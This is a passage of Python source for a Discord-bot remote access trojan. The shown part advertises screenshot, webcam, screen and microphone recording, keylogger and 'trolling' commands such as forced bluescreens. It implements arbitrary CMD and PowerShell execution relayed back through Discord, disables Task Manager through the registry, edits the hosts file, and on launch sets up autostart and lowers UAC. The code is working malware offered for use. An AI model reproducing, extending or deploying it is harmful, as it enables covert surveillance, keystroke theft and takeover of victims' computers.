            "`!unblockwebsite PC-Name \"URL\"` - Unblock it\n"
        ),
        inline=False
    )

    # Media Commands
    embed.add_field(
        name="📸 **Media Controls**",
        value=(
            "`!screenshot PC-Name` - Capture all monitors\n"
            "`!webcam PC-Name` - Take webcam photo\n"
            "`!recdesktop PC-Name [Seconds]` - Record screen\n"
            "`!recmicrophone PC-Name [Seconds]` - Record audio"
        ),
        inline=False
    )

    # Fun/Trolling
    embed.add_field(
        name="🎭 **Fun Commands**",
        value=(
            "`!jumpscare PC-Name` - Trigger jumpscare\n"
            "`!bluescreen PC-Name` - Trigger BSOD\n"
            "`!rickroll PC-Name` - Rickroll the user\n"
            "`!lock PC-Name` - Lock system\n"
            "`!unlock PC-Name` - Unlock system\n"
        ),
        inline=False
    )

    # Keylogger
    embed.add_field(
        name="⌨️ **Keylogger**",
        value=(
            "`!keyloggerstart PC-Name` - Start keylogger\n"
            "`!keyloggerstop PC-Name` - Stop & send logs\n"
            "`!keyloggerstatus PC-Name` - Show status"
        ),
        inline=False
    )

    embed.set_footer(text=f"Requested by {ctx.author.display_name} | Bot by Ole4923")
    await ctx.send(embed=embed)

@bot.command(name="disabletaskmanager")
async def disable_taskmanager(ctx, pc_name: str):
    """Disable Task Manager (!disabletaskmanager PC-Name)"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        subprocess.run(
            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System', 
             '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'],
            check=True
        )
        await ctx.send("✅ Task Manager disabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="enabletaskmanager")
async def enable_taskmanager(ctx, pc_name: str):
    """Enable Task Manager (!enabletaskmanager PC-Name)"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        subprocess.run(
            ['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System', 
             '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'],
            check=True
        )
        await ctx.send("✅ Task Manager enabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="cmd")
async def run_cmd(ctx, pc_name: str, *, command: str):
    """Execute CMD command (!cmd PC-Name "command")"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=30
        )
        
        output = result.stdout or result.stderr or "No output"
        if len(output) > 1500:
            with io.StringIO(output) as f:
                await ctx.send(
                    "📜 Command output (truncated):",
                    file=discord.File(f, "output.txt")
                )
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="powershell")
async def run_powershell(ctx, pc_name: str, *, script: str):
    """Execute PowerShell script (!powershell PC-Name "script")"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        result = subprocess.run(
            ["powershell", "-Command", script],
            capture_output=True,
            text=True,
            timeout=60
        )
        
        output = result.stdout or result.stderr or "No output"
        if len(output) > 1500:
            with io.StringIO(output) as f:
                await ctx.send(
                    "📜 PowerShell output:",
                    file=discord.File(f, "ps_output.txt")
                )
        else:
            await ctx.send(f"```powershell\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="blockwebsite")
async def block_website(ctx, pc_name: str, url: str):
    """Block a website with/without www (!blockwebsite PC-Name "URL")"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        clean_url = url.replace("https://", "").replace("http://", "").split("/")[0]
        
        with open(hosts_path, 'a') as f:
            f.write(f"\n127.0.0.1 {clean_url}\n")
            if not clean_url.startswith("www."):
                f.write(f"127.0.0.1 www.{clean_url}\n")  # Blockiere auch www-Version
        
        await ctx.send(f"✅ Blocked: `{clean_url}` + `www.{clean_url}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="unblockwebsite")
async def unblock_website(ctx, pc_name: str, url: str):
    """Unblock a website (!unblockwebsite PC-Name "URL")"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        clean_url = url.replace("https://", "").replace("http://", "").split("/")[0]
        
        # Lese Hosts-Datei und filtere ALLE Varianten der URL (mit/ohne www)
        with open(hosts_path, 'r') as f:
            lines = f.readlines()
        
        with open(hosts_path, 'w') as f:
            for line in lines:
                # Behalte Zeilen, die NICHT die URL enthalten (weder mit noch ohne www)
                if clean_url not in line and f"www.{clean_url}" not in line:
                    f.write(line)
        
        await ctx.send(f"✅ Unblocked: `{clean_url}` + `www.{clean_url}`")
    except PermissionError:
        await ctx.send("❌ Permission denied. Run bot as Administrator!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

setup_autostart()
set_lowest_uac_level()
bot.run(TOKEN)
